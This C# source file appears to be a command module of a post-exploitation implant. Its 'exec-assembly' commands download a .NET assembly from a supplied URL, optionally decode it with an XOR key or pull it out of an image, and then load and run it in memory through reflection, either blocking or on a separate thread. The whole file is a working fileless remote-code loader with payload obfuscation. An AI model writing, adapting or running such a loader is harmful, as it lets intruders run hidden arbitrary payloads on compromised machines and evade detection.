using System;
using System.IO;
using System.Reflection;
using System.Threading;
using System.Text;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Net;
using System.Linq;

namespace Application 
{
    public static class AssemblyModule
    {
        public static Dictionary<string,string> GetInstructions()
        {
            Dictionary<string,string> menuextensions = new Dictionary<string,string>(){
                {"exec-assembly", "Run .NET assembly from a url (exec-assembly URI Param)"},
                {"exec-assembly-xor", "Run .NET assembly from a url (exec-assembly-xor XORKey URI Param)"},
                {"exec-assembly-img", "Run .NET assembly from a url (exec-assembly-img XORKey URI Param)"},
                {"exec-assemblydll", "Run .NET assembly from a url (exec-assembly URI Param)"},
                {"exec-assemblydll-xor", "Run .NET assembly from a url (exec-assemblydll-xor XORKey URI Type Method Param)"},
                {"exec-assemblydll-img", "Run .NET assembly from a url (exec-assemblydll-img XORKey URI Type Method Param)"}
            };
            return menuextensions;
        }

        public static void Operate(string[] instruction) {

            // define the variables
            string url = null;
            string type = null;
            string method = null;
            string xorkey = null;            
            string xortype = null;
            int skip = 2 ;            

            // collect the input for each instruction type
            switch (instruction[0]) {
                case "exec-assembly":
                    url = instruction[1];
                    break;
                case "exec-assembly-xor":
                    xortype = "xor";
                    xorkey = instruction[1];
                    url = instruction[2];
                    skip = 3;
                    break;
                case "exec-assembly-img":
                    xortype = "image";
                    xorkey = instruction[1];
                    url = instruction[2];
                    skip = 3;
                    break;                    
                case "exec-assemblydll":
                    url = instruction[1];
                    type = instruction[2];
                    method = instruction[3];
                    skip = 4;
                    break;
                case "exec-assemblydll-xor":
                    xortype = "xor";
                    xorkey = instruction[1];
                    url = instruction[2];
                    type = instruction[3];
                    method = instruction[4];
                    skip = 5;
                    break;    
                case "exec-assemblydll-img":
                    xortype = "image";
                    xorkey = instruction[1];
                    url = instruction[2];
                    type = instruction[3];
                    method = instruction[4];
                    skip = 5;
                    break;                                                           
                default:
                    Console.WriteLine("Instruction format is not supported, use help for examples.");
                    break;
            }

            // get the content
            byte[] asm = Program.GetContent(url);

            // skip the content before parameters
            string[] parameters = instruction.Skip(skip).ToArray();

            // decode for XOR or Image XOR accordingly
            switch (xortype)
            {
                case "xor":
                    asm = Program.XOR(asm, xorkey);
                    break;
                case "image":
                    asm = Program.LoadDataFromImage(asm, xorkey);
                    break;
                default:
                    break;
            }

            // run the assembly and parameters
            ExecSharpAssembly(asm,type,method,parameters);

        }
        
        public static void ExecSharpAssembly(byte[] sharpassembly, string tn, string mn, string[] arguments, bool wait = true)
		{
			Assembly a = Assembly.Load(sharpassembly);
            MethodInfo method;

            // if the Type name is null, run the EntryPoint
            if (tn == null) {
                method = a.EntryPoint;
            }
            else {
                // Type
                Type t = a.GetType(tn);

                // Method
                method = t.GetMethod(mn);
            }

			object o = a.CreateInstance(method.Name);

					
			if (wait)
			{
				//Console.WriteLine("I wait for the assembly to finish...");
				if (arguments == null || arguments.Length == 0)
				{
				method.Invoke(o, null);
				}
				else
				{
				object[] ao = { arguments };
				method.Invoke(o, ao);
				}               

			}
			else
			{
				//Console.WriteLine("I don't wait for the assembly to finish...");
				// start as a thread if not waiting
				ThreadStart ths;
				if (arguments.Length == 0)
				{
				ths = new ThreadStart(() => method.Invoke(o, null));
				}
				else
				{
				object[] ao = { arguments };
				ths = new ThreadStart(() => method.Invoke(o, ao));
				}

				Thread th = new Thread(ths);
				th.Start();
			}

			return;
		}
    }
}

